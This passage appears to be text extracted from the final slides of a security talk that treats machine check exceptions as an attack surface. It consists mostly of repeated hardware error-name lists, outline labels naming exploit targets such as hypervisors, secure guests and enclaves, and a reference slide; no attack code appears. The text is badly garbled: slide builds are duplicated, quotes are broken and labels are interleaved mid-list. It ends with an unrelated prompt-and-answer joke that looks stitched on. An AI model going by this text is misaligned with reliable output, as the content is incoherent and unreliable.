"LS0 Exit Error” "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error" "FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error" "Packet Type Error" "Rx FIFO Error" "Deskew Error" "Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error" "Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error" "Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error" "Remote Link Fatal Error" "Data Loss Error" "Training Error" "Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error" "Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error" "LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

ECC injection processor errata row-hammer bit flips in DRAM

## Slide 253

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error"

"MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error"

"MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error"

"CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error"

"SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error” "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error” "Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error” "Rx Replay Timeout Error” "LinkSub Tx Timeout Error” "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" ⊷Other sources of MCEsOther sources of MCEs "RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" ⊷Asynchronous MCEsAsynchronous MCEs "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0” "Parity error or ECC error for S0 RAM1" "Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error” "Data Startup Limit Error” "LS0 Exit Error” "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error" "FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error" "Packet Type Error" "Rx FIFO Error" "Deskew Error" "Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error" "Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error" "Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error" "Remote Link Fatal Error" "Data Loss Error" "Training Error" "Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error" "Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error" "LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

⊷Other sources of MCEsOther sources of MCEs ⊷Asynchronous MCEsAsynchronous MCEs

ECC injection processor errata row-hammer bit flips in DRAM memory scrubber other MMIO no MMIO

## Slide 254

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error"

"MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" "MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error"

"CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error"

"SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"

"CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error”

"Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error"

"Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error” "Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error” "Rx Replay Timeout Error” "LinkSub Tx Timeout Error” "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" ⊷Other sources of MCEs "RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" ⊷Asynchronous MCEs "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0” ⊷Userland MCEs "Parity error or ECC error for S0 RAM1" "Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error” "Data Startup Limit Error” "LS0 Exit Error” "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error" "FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error" "Packet Type Error" "Rx FIFO Error" "Deskew Error" "Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error" "Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error" "Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error" "Remote Link Fatal Error" "Data Loss Error" "Training Error"

⊷Other sources of MCEs ⊷Asynchronous MCEs ⊷Userland MCEs

ECC injection processor errata row-hammer bit flips in DRAM memory scrubber other MMIO no MMIO ring-3 errata faulty devices here-be-dragons

"Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error"

"Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error" "LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

## Slide 255

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error"

"MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error"

"MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error"

"CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error"

"SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"

"CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error”

"Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error"

"Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error"

"Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error"

"Recovery Attempt Error" "Recovery Relock Attempt Error” "Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error” "Rx Replay Timeout Error” "LinkSub Tx Timeout Error” "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" "RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0”

⊷Other sources of MCEs ⊷Asynchronous MCEs ⊷Userland MCEs ⊷Other exploit targets

"Parity error or ECC error for S0 RAM1"

"Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error” "Data Startup Limit Error” "LS0 Exit Error” "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error"

"FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error"

ECC injection processor errata row-hammer bit flips in DRAM memory scrubber other MMIO no MMIO ring-3 errata faulty devices here-be-dragons hypervisors secure guests enclaves secure loader

"Packet Type Error" "Rx FIFO Error" "Deskew Error"

"Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error"

"Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error"

"Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error"

"Remote Link Fatal Error" "Data Loss Error" "Training Error"

"Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"

"CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error"

"Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error"

"LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

## Slide 256

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error"

ECC injection "MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" ” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" processor errata "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"”” row-hammer bit flips in DRAM memory scrubber other MMIO ⊷Other sources of MCEs no MMIO ⊷Asynchronous MCEs ring-3 errata ⊷Userland MCEs faulty devices here-be-dragons ⊷Other exploit targets hypervisors ⊷Other architectures secure guests enclaves secure loader ARM RISC-V MIPS PowerPC/Power

"MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error"

"MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error"

"Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error"

"CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error"

"SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"”

"CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"””

"Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error"

"Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error"

"Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error"

"Recovery Attempt Error" "Recovery Relock Attempt Error”

"Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error”

"Rx Replay Timeout Error” "LinkSub Tx Timeout Error”

"LinkSub Rx Timeout Error" "Rx CMD Pocket Error"

"RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0”

"Parity error or ECC error for S0 RAM1"

"Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1"

"AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error"

"Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error"

"Recovery Attempt Error" "Eye Training Timeout Error”

"Data Startup Limit Error” "LS0 Exit Error”

"PLL powerState Update Timeout Error" "Rx FIFO Error"

"Lcu Error" "Conv CECC Error" "Conv UECC Error"

"Reserved" "Rx DataLoss Error" "Replay CECC Error"

"Replay UECC Error" "CRC Error" "BER Exceeded Error"

"FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error"

"Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error"

"Packet Type Error" "Rx FIFO Error" "Deskew Error"

"Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error"

"Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error"

"Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error"

"Remote Link Fatal Error" "Data Loss Error" "Training Error"

"Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"

"CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error"

"Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error"

"LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

## Slide 257

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error"

ECC injection "MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" ” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" processor errata "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"”” row-hammer bit flips in DRAM memory scrubber other MMIO ⊷Other sources of MCEs no MMIO ⊷Asynchronous MCEs ring-3 errata ⊷Userland MCEs faulty devices here-be-dragons ⊷Other exploit targets hypervisors ⊷Other architectures secure guests ⊷Tip of the iceberg… enclaves secure loader ARM RISC-V MIPS PowerPC/Power future research ???

"MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error"

"MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error"

"Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error"

"CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error"

"SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"”

"CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"””

"Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error"

"Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error"

"Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error"

"Recovery Attempt Error" "Recovery Relock Attempt Error”

"Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error”

"Rx Replay Timeout Error” "LinkSub Tx Timeout Error”

"LinkSub Rx Timeout Error" "Rx CMD Pocket Error"

"RAM ECC Error" "ARC instruction buffer parity error”

"ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0"

"Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0”

"Parity error or ECC error for S0 RAM1"

"Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1"

"AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error”

"Data Startup Limit Error” "LS0 Exit Error”

"PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error"

"Reserved" "Rx DataLoss Error" "Replay CECC Error"

"Replay UECC Error" "CRC Error" "BER Exceeded Error"

"FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error"

"Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error"

"Packet Type Error" "Rx FIFO Error" "Deskew Error"

"Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error"

"Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error"

"Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error"

"Remote Link Fatal Error" "Data Loss Error" "Training Error"

"Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"

"CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error"

"Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error"

"LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error"

"LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

## Slide 258

#### ⊸ INT31 team

- ⊸ dazzle cat (Stephanie)

⊸ Andi Kleen - "Machine check handling on Linux" ⊸ Wojtczuk - "A Stitch In Time Saves Nine: A Stitch In Time Saves Nine" ⊸ Schluter et al. - "Heckler: Breaking Confidential VMs with Malicious Interrupts" ⊸ Google Cloud Security - "Intel Trust Domain Extensions (TDX) Security Review" ⊸ Peterson/Mulasmajic - "POP SS/MOV SS Vulnerability” ⊸ Steven Rostedt – “The x86 NMI iret problem” ⊸ Andy Lutomirski - CVE-2014-9090 ⊸ Van Bulck et al. – SGX-Step

- ⊸ arch/x86/kernel/cpu/mce/severity.c

- ⊸ arch/x86/kernel/cpu/mce/amd.c

- ⊸ arch/x86/kernel/cpu/mce/intel.c

- ⊸ arch/powerpc/kernel/mce_power.c

- ⊸ drivers/edac/amd64_edac.c

- ⊸ drivers/edac/mce_amd.c

⊸ …

… keep digging

## Slide 259

more to come

@xoreaxeaxeax github.com/xoreaxeaxeax/mchammer

conclusion

## Slide 260

## Slide 261

Tell a joke about machine check exceptions.

Why don’t machine check exceptions get invited to computer parties? Because they always bring the system down.
